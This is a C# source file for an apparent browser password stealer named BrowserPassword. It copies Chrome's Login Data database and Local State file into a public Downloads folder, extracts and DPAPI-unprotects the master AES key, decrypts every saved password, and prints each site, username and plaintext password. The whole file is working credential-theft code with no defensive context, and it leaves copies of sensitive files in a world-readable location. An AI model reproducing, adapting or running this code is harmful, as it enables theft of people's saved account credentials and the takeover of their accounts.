using System;
using System.IO;
using System.Text;
using BrowserPassword.crypto;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Community.CsharpSqlite.SQLiteClient;

namespace BrowserPassword.Browsers
{
    public class Chrome
    {
        public void CopyLoginData()
        {
            string chromeLoginDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
            string targetPath = "C:\\Users\\Public\\Downloads\\LoginData";
            if (!File.Exists(targetPath))
            {
                File.Copy(chromeLoginDataPath, targetPath);

            }
        }

        public void CopyLocalState()
        {
            string chromeLoginStatePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Local State";
            string targetPath = "C:\\Users\\Public\\Downloads\\LoginState";
            if (!File.Exists(targetPath))
            {
                File.Copy(chromeLoginStatePath, targetPath);

            }
        }


        public byte[] GetAesKey()
        {
            CopyLocalState();
            string targetPath = "C:\\Users\\Public\\Downloads\\LoginState";
            string content = File.ReadAllText(targetPath);

            string pattern = "\"encrypted_key\":\"([^\"]*)";
            Regex regex = new Regex(pattern);
            Match match = regex.Match(content);
            if (match.Success)
            {
                string encryptedKey = match.Groups[1].Value;
                byte[] base64DecodedByte = Convert.FromBase64String(encryptedKey);
                byte[] hasRemoveDPAPIByte = new byte[base64DecodedByte.Length - 5];
                Array.Copy(base64DecodedByte, 5, hasRemoveDPAPIByte, 0, base64DecodedByte.Length - 5);

                try
                {
                    byte[] aes_key = ProtectedData.Unprotect(hasRemoveDPAPIByte, null, DataProtectionScope.CurrentUser);
                    return aes_key;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else
            {
                Console.WriteLine("获取encrypted_key失败\n");
            }
            return null;

        }


        public string GetPasswd_before80(byte[] passwordByte)
        {
            try
            {
                string decryptedPasswd = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordByte, null, DataProtectionScope.CurrentUser));
                return decryptedPasswd;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return null;
        }

        public string GetPasswd_after80(byte[] passwordByte, byte[] aesKey)
        {
            //得到iv（一共12字节；因为除开v10，所以要从第3个字节开始往后一共获取到12个字节）
            byte[] iv = new byte[12];
            Array.Copy(passwordByte, 3, iv, 0, 12);

            //得到除开v10（3字节） + iv（12字节）后的字节（从第15字节开始）
            byte[] Buffer = new byte[passwordByte.Length - 15];
            Array.Copy(passwordByte, 15, Buffer, 0, passwordByte.Length - 15);

            //得到认证标签，一共16字节；
            byte[] tag = new byte[16];
            Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

            //得到真正的密码密文
            byte[] data = new byte[Buffer.Length - tag.Length];
            //encrypted password
            Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

            AesGcm aesDecryptor = new AesGcm();
            string result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(aesKey, iv, null, data, tag));

            return result;
        }

        public void gogogo_Chrome()
        {
            string connectString = "Data Source=C:\\Users\\Public\\Downloads\\LoginData";
            SqliteConnection connection = new SqliteConnection(connectString);

            try
            {
                connection.Open();
                string query = "SELECT origin_url, username_value, password_value FROM logins";
                // 将连接设置到 SqliteCommand
                SqliteCommand cmd = new SqliteCommand(query, connection);
                SqliteDataReader reader = cmd.ExecuteReader();
                int count = 1;
                byte[] aesKey = GetAesKey();
                while (reader.Read())
                {
                    string passwd;
                    string url = reader.GetValue(0).ToString();
                    string username = reader.GetValue(1).ToString();
                    byte[] passwordByte = (byte[])reader.GetValue(2);
                    string passddd = Encoding.UTF8.GetString(passwordByte);

                    if (passddd.StartsWith("v1"))
                    {
                        passwd = GetPasswd_after80(passwordByte, aesKey);
                    }
                    else
                    {
                        passwd = GetPasswd_before80(passwordByte);
                    }
                    Console.WriteLine(url + "\n" + "user:" + username + "\n" + "passwd:" + passwd + "\n");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                connection.Close();
            }
        }
    }
}
